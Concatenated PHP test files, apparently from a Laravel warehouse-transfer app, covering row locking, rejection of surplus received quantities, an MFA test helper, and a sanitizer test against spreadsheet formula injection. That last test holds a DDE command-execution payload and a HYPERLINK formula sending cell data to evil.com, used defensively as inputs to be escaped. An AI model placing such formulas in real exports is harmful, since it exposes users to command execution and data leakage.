193:         $this->service->receive($transfer->fresh(), [$itemId => 2]);
194: 
195:         $this->actingAs($this->adminA);
196: 
197:         $locks = $this->captureTransferLocks(function () use ($transfer) {
198:             $this->service->resolveDisputed($transfer->fresh(), 'loss_accepted');
199:         });
200: 
201:         $this->assertGreaterThanOrEqual(1, $locks);
202:     }
203: 
204:     // ==================================================================
205:     // 5. cancel() locks the transfer row
206:     // ==================================================================
207: 
208:     public function test_cancel_locks_transfer_row_before_status_check(): void
209:     {
210:         $transfer = $this->makeDraftTransfer();
211: 
212:         $locks = $this->captureTransferLocks(function () use ($transfer) {
213:             $this->service->cancel($transfer);
214:         });
215: 
216:         $this->assertGreaterThanOrEqual(1, $locks);
217:     }
218: 
219:     // ==================================================================
220:     // 6. Regression — dispatch twice on same transfer is rejected
221:     //    (existing behaviour, must still hold after the lock fix)
222:     // ==================================================================
223: 
224:     public function test_dispatch_rejects_second_call(): void
225:     {
226:         $transfer = $this->makeDraftTransfer();
227:         $this->service->dispatch($transfer);
228: 
229:         $this->expectException(ValidationException::class);
230: 
231:         $this->service->dispatch($transfer->fresh());
232:     }
233: 
234:     // ==================================================================
235:     // 7. Regression — cancel after dispatch is rejected
236:     // ==================================================================
237: 
238:     public function test_cancel_rejects_dispatched_transfer(): void
239:     {
240:         $transfer = $this->makeDraftTransfer();
241:         $this->service->dispatch($transfer);
242: 
243:         $this->expectException(ValidationException::class);
244: 
245:         $this->service->cancel($transfer->fresh());
246:     }
247: 
248:     // ==================================================================
249:     // 8. Regression — resolve only works on disputed transfers
250:     // ==================================================================
251: 
252:     public function test_resolve_rejects_non_disputed_transfer(): void
253:     {
254:         $transfer = $this->makeDraftTransfer();
255: 
256:         $this->expectException(ValidationException::class);
257: 
258:         $this->service->resolveDisputed($transfer, 'loss_accepted');
259:     }
260: }

<file path="tests/Feature/WarehouseTransferSurplusTest.php">
  1: <?php
  2: 
  3: namespace Tests\Feature;
  4: 
  5: use App\Enums\TransferStatus;
  6: use App\Enums\TransferType;
  7: use App\Models\Company;
  8: use App\Models\Garage;
  9: use App\Models\User;
 10: use App\Models\Warehouse;
 11: use App\Models\WarehouseTransfer;
 12: use App\Services\GarageContext;
 13: use App\Services\Warehouse\WarehouseTransferService;
 14: use Illuminate\Foundation\Testing\RefreshDatabase;
 15: use Illuminate\Validation\ValidationException;
 16: use Tests\TestCase;
 17: 
 18: /**
 19:  * Regression guard for the surplus-inventory bug.
 20:  *
 21:  * Before the fix, receive() only validated `received >= 0`. A destination
 22:  * could declare it received MORE units than the source dispatched,
 23:  * and the destination stock would be credited with the higher number.
 24:  * Since dispatch() already deducted exactly `declared` from the source,
 25:  * the difference appeared as stock created out of thin air.
 26:  *
 27:  * The fix rejects any `received > declared` at both the FormRequest
 28:  * layer AND the service layer (defense-in-depth for callers that
 29:  * bypass HTTP — queue jobs, CLI, tests).
 30:  */
 31: class WarehouseTransferSurplusTest extends TestCase
 32: {
 33:     use RefreshDatabase;
 34: 
 35:     protected Company $company;
 36: 
 37:     protected Garage $garageA;
 38: 
 39:     protected Garage $garageB;
 40: 
 41:     protected User $adminA;
 42: 
 43:     protected User $adminB;
 44: 
 45:     protected WarehouseTransferService $service;
 46: 
 47:     protected function setUp(): void
 48:     {
 49:         parent::setUp();
 50: 
 51:         $this->company = Company::factory()->create();
 52:         $this->garageA = Garage::factory()->create(['company_id' => $this->company->id]);
 53:         $this->garageB = Garage::factory()->create(['company_id' => $this->company->id]);
 54: 
 55:         $this->adminA = User::factory()->create(['role' => 'user']);
 56:         $this->adminA->garages()->attach($this->garageA->id, ['role' => 'admin', 'is_active' => true]);
 57: 
 58:         $this->adminB = User::factory()->create(['role' => 'user']);
 59:         $this->adminB->garages()->attach($this->garageB->id, ['role' => 'admin', 'is_active' => true]);
 60: 
 61:         GarageContext::set($this->garageA->id, $this->company->id);
 62: 
 63:         $this->service = app(WarehouseTransferService::class);
 64:     }
 65: 
 66:     protected function tearDown(): void
 67:     {
 68:         GarageContext::clear();
 69:         parent::tearDown();
 70:     }
 71: 
 72:     // ==================================================================
 73:     // HELPERS
 74:     // ==================================================================
 75: 
 76:     protected function makeWarehouse(Garage $garage, string $code = 'W-001', int $qty = 100): Warehouse
 77:     {
 78:         return Warehouse::withoutGlobalScopes()->create([
 79:             'garage_id' => $garage->id,
 80:             'company_id' => $this->company->id,
 81:             'code' => $code,
 82:             'name' => "Part {$code}",
 83:             'quantity' => $qty,
 84:         ]);
 85:     }
 86: 
 87:     protected function makeDispatchedTransfer(int $declared = 5): WarehouseTransfer
 88:     {
 89:         $source = $this->makeWarehouse($this->garageA, 'W-001', 100);
 90: 
 91:         $this->actingAs($this->adminA);
 92: 
 93:         $transfer = $this->service->create([
 94:             'from_garage_id' => $this->garageA->id,
 95:             'to_garage_id' => $this->garageB->id,
 96:             'type' => TransferType::GarageToGarage->value,
 97:             'items' => [['warehouse_id' => $source->id, 'declared_quantity' => $declared]],
 98:         ], $this->company->id);
 99: 
100:         $this->service->dispatch($transfer);
101: 
102:         return $transfer->fresh();
103:     }
104: 
105:     // ==================================================================
106:     // 1. SERVICE LAYER — surplus is rejected
107:     // ==================================================================
108:

<file path="tests/Traits/MakesSuperAdminWithMfa.php">
 1: <?php
 2: 
 3: namespace Tests\Traits;
 4: 
 5: use App\Models\User;
 6: use App\Support\TwoFactor\TwoFactorManager;
 7: 
 8: /**
 9:  * Helper for tests that need a fully set-up SuperAdmin.
10:  *
11:  * The `2fa.verified` middleware redirects any SuperAdmin without
12:  * confirmed MFA to the setup wizard. Tests that are NOT about MFA
13:  * itself (onboarding, pivot audit, form requests, etc.) need a
14:  * ready SuperAdmin so the rest of the flow runs normally.
15:  */
16: trait MakesSuperAdminWithMfa
17: {
18:     protected function makeSuperAdminWithMfa(array $attributes = []): User
19:     {
20:         $manager = app(TwoFactorManager::class);
21: 
22:         $superAdmin = User::factory()->create(array_merge([
23:             'role' => 'super_admin',
24:             'is_active' => true,
25:         ], $attributes));
26: 
27:         $superAdmin->forceFill([
28:             'two_factor_secret' => $manager->generateSecret(),
29:             'two_factor_confirmed_at' => now(),
30:             'two_factor_recovery_codes' => [],
31:         ])->save();
32: 
33:         return $superAdmin->fresh();
34:     }
35: }

105:             $this->assertNotEmpty($labels[$case->value]);
106:         }
107:     }
108: 
109:     public function test_garage_role_labels_excludes_global_and_company_roles(): void
110:     {
111:         app()->setLocale('en');
112: 
113:         $garageLabels = RoleEnum::garageRoleLabels();
114: 
115:         // Global roles must not appear
116:         $this->assertArrayNotHasKey('super_admin', $garageLabels);
117:         $this->assertArrayNotHasKey('user', $garageLabels);
118: 
119:         // Company-level role must not appear
120:         $this->assertArrayNotHasKey('director', $garageLabels);
121: 
122:         // Garage roles must be present
123:         $this->assertArrayHasKey('admin', $garageLabels);
124:         $this->assertArrayHasKey('complaint_manager', $garageLabels);

<file path="tests/Unit/Support/SafeCellTest.php">
  1: <?php
  2: 
  3: namespace Tests\Unit\Support;
  4: 
  5: use App\Support\Excel\SafeCell;
  6: use PHPUnit\Framework\TestCase;
  7: 
  8: class SafeCellTest extends TestCase
  9: {
 10:     // ==================================================================
 11:     // 1. FORMULA PREFIXES ARE ESCAPED
 12:     // ==================================================================
 13: 
 14:     public function test_equals_prefix_is_escaped(): void
 15:     {
 16:         $this->assertSame("'=SUM(A1:A2)", SafeCell::sanitize('=SUM(A1:A2)'));
 17:     }
 18: 
 19:     public function test_plus_prefix_is_escaped(): void
 20:     {
 21:         $this->assertSame("'+1+2", SafeCell::sanitize('+1+2'));
 22:     }
 23: 
 24:     public function test_minus_prefix_is_escaped(): void
 25:     {
 26:         $this->assertSame("'-cmd", SafeCell::sanitize('-cmd'));
 27:     }
 28: 
 29:     public function test_at_prefix_is_escaped(): void
 30:     {
 31:         $this->assertSame("'@SUM(A1)", SafeCell::sanitize('@SUM(A1)'));
 32:     }
 33: 
 34:     public function test_tab_prefix_is_escaped(): void
 35:     {
 36:         $this->assertSame("'\tDATA", SafeCell::sanitize("\tDATA"));
 37:     }
 38: 
 39:     public function test_carriage_return_prefix_is_escaped(): void
 40:     {
 41:         $this->assertSame("'\rDATA", SafeCell::sanitize("\rDATA"));
 42:     }
 43: 
 44:     // ==================================================================
 45:     // 2. COMMON INJECTION PAYLOADS
 46:     // ==================================================================
 47: 
 48:     public function test_classic_cmd_injection_payload_is_escaped(): void
 49:     {
 50:         // The infamous CSV injection payload that opens Calculator on
 51:         // Windows when the victim clicks the cell.
 52:         $payload = '=cmd|\'/c calc\'!A0';
 53: 
 54:         $result = SafeCell::sanitize($payload);
 55: 
 56:         $this->assertStringStartsWith("'", $result);
 57:         $this->assertSame("'".$payload, $result);
 58:     }
 59: 
 60:     public function test_hyperlink_injection_payload_is_escaped(): void
 61:     {
 62:         $payload = '=HYPERLINK("http://evil.com?x="&A1,"Click me")';
 63: 
 64:         $result = SafeCell::sanitize($payload);
 65: 
 66:         $this->assertSame("'".$payload, $result);
 67:     }
 68: 
 69:     // ==================================================================
 70:     // 3. SAFE VALUES ARE UNCHANGED
 71:     // ==================================================================
 72: 
 73:     public function test_normal_text_is_unchanged(): void
 74:     {
 75:         $this->assertSame('Elshad Mammadov', SafeCell::sanitize('Elshad Mammadov'));
 76:     }
 77: 
 78:     public function test_text_with_space_before_plus_is_safe(): void
 79:     {
 80:         // Phone numbers with leading + are common — but they usually
 81:         // come AFTER whitespace or include a country code that Excel
 82:         // recognizes as a number, not a formula. A space-first value
 83:         // is not a formula.
 84:         $this->assertSame(' +994 50 123 45 67', SafeCell::sanitize(' +994 50 123 45 67'));
 85:     }
 86: 
 87:     public function test_numbers_are_unchanged(): void
 88:     {
 89:         $this->assertSame(42, SafeCell::sanitize(42));
 90:         $this->assertSame(3.14, SafeCell::sanitize(3.14));
 91:     }
 92: 
 93:     public function test_boolean_and_null_are_unchanged(): void
 94:     {
 95:         $this->assertTrue(SafeCell::sanitize(true));
 96:         $this->assertFalse(SafeCell::sanitize(false));
 97:         $this->assertNull(SafeCell::sanitize(null));
 98:     }
 99: 
100:     public function test_empty_string_returns_empty(): void
101:     {
102:         $this->assertSame('', SafeCell::sanitize(''));
103:     }
104: 
105:     // ==================================================================
106:     // 4. CONTROL CHARACTERS ARE STRIPPED
107:     // ==================================================================
108: 
109:     public function test_null_byte_is_stripped(): void
110:     {
111:         $this->assertSame('HelloWorld', SafeCell::sanitize("Hello\x00World"));
112:     }
113: 
114:     public function test_control_characters_are_stripped(): void
115:     {
116:         $this->assertSame('AB', SafeCell::sanitize("A\x01\x02B"));
117:         $this->assertSame('AB', SafeCell::sanitize("A\x1FB"));
118:     }
119: 
120:     // ==================================================================
121:     // 5. RETURN TYPE CONSISTENCY
122:     // ==================================================================
123: 
124:     public function test_method_accepts_and_returns_mixed(): void
125:     {
126:         // The signature is `sanitize(mixed $value): mixed` — verify
127:         // that all common types pass through unchanged except strings
128:         // that need escaping.
129:         $inputs = ['text', 42, 3.14, true, false, null, []];
130: 
131:         foreach ($inputs as $input) {
132:             $result = SafeCell::sanitize($input);
133: 
134:             if (is_string($input)) {
135:                 $this->assertIsString($result);
136:             } else {
137:                 $this->assertSame($input, $result);
138:             }
139:         }
140:     }
141: }
</file>
